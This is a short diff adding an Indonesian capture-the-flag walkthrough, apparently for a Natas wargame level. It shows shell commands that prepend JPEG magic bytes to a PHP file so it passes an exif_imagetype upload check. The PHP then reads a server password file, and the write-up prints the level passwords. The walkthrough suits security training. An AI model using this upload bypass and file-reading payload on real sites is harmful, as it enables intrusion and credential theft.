@@ -2,4 +2,17 @@
 # password : trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC 
 
 Solution : 
-1.
+1. Kita cek terlebih dahulu 'view Sourcecode'
+2. Terlihat bahwa pada level ini sama seperti level sebelumnya,namun yang 
+membedakan adalah di level ini memakai exif_imagetype yang artinya file 
+yang di upload harus format foto
+3. Setelah memahami exif_imagetype,langkah yang trick untuk bisa bypass 
+adalah membuat file .php dan mengisi format signature jpeg.
+ $ echo -e "\xFF\xD8\xFF\xE0" > bypass.php (dengan command ini sudah 
+dipastikan filenya berformat jpeg)
+ $ echo -n '<?php $result=file_get_contents("/etc/natas_webpass/natas14"); 
+echo $result; ?>' >> bypass.php
+4. Setelah itu,seperti level sebelumnya kita lakukan inspect,ubah .png 
+menjadi .php
+5.Setelah itu,upload dan bukak file tersebut dan voila kita mendapatkan 
+password level berikutnya "z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ"
